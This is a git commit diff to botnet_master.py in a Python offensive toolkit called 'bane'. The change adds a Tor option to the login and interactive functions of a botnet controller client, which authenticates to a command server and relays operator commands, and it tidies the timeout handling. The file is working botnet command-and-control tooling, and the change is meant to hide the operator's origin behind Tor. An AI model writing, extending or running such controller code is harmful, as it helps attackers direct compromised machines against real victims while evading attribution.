fd569c2f889361f2b5a461c4fd5865322193f25c
AlaBouali <ala.bouali.1997@gmail.com>
2023-11-03 01:32:08 +0100

    tor proxy support for botnet master

--- bane/scanners/botnet/botnet_master.py
+++ bane/scanners/botnet/botnet_master.py
@@ -1,4 +1,5 @@
 import socket,os,sys,pwinput
+from bane.utils.socket_connection import *
 
 if sys.version_info < (3, 0):
     user_input=raw_input
@@ -11,23 +12,21 @@ class Botnet_Master:
     @staticmethod
     def send_data(data,sock,timeout=2,real_timeout=3):
         sock.send('{}\n'.format(data).encode())
-        return Botnet_Master.read_data(sock,timeout=2,real_timeout=3)
+        return Botnet_Master.read_data(sock,timeout=timeout,real_timeout=real_timeout)
 
     
-    def login(self,host,port,username,password,timeout=3,read_timeout=2):
-        self.sock=socket.socket()
-        self.sock.settimeout(timeout)
-        self.sock.connect((host,port))
-        Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
-        self.sock.send('{}\n'.format(username).encode())
-        Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
-        self.sock.send('{}\n'.format(password).encode())
-        self.data=Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
+    def login(self,host,port,username,password,timeout=3,read_timeout=2,tor=False):
+        if tor==True:
+            self.sock=Socket_Connection.get_tor_socket_connection(host,port,timeout=timeout)
+        else:
+            self.sock=Socket_Connection.get_socket_connection(host,port,timeout=timeout)
+        Botnet_Master.send_data(username,self.sock,timeout=read_timeout,real_timeout=timeout)
+        self.data=Botnet_Master.send_data(password,self.sock,timeout=read_timeout,real_timeout=timeout)
         if 'failed' in self.data:
             raise Exception('Login failed')
 
     def execute(self,cmd,timeout=2,real_timeout=3):
-        return Botnet_Master.send_data(cmd,self.sock,timeout=2,real_timeout=3)
+        return Botnet_Master.send_data(cmd,self.sock,timeout=timeout,real_timeout=real_timeout)
     
     def close(self):
         self.sock.close()
@@ -49,17 +48,16 @@ class Botnet_Master:
         return data
 
     @staticmethod
-    def interact(host,port,read_timeout=3,timeout=3):
-        s=socket.socket()
-        s.settimeout(timeout)
-        s.connect((host,port))
+    def interact(host,port,read_timeout=3,timeout=3,tor=False):
+        if tor==True:
+            s=Socket_Connection.get_tor_socket_connection(host,port,timeout=timeout)
+        else:
+            s=Socket_Connection.get_socket_connection(host,port,timeout=timeout)
         data=Botnet_Master.read_data(s,timeout=read_timeout,real_timeout=timeout)
         username=user_input(data)
-        s.send('{}\n'.format(username).encode())
-        data=Botnet_Master.read_data(s,timeout=read_timeout,real_timeout=timeout)
+        data=Botnet_Master.send_data(username,s,timeout=read_timeout,real_timeout=timeout)
         password=pwinput.pwinput(prompt=data, mask='*')
-        s.send('{}\n'.format(password).encode())
+        data=Botnet_Master.send_data(password,s,timeout=read_timeout,real_timeout=timeout)
         while True:
-            data=Botnet_Master.read_data(s,timeout=read_timeout,real_timeout=timeout)
-            cmd=user_input(data)
-            s.send('{}\n'.format(cmd).encode())
+            cmd=user_input(data+' ')
+            data=Botnet_Master.send_data(cmd,s,timeout=read_timeout,real_timeout=timeout)
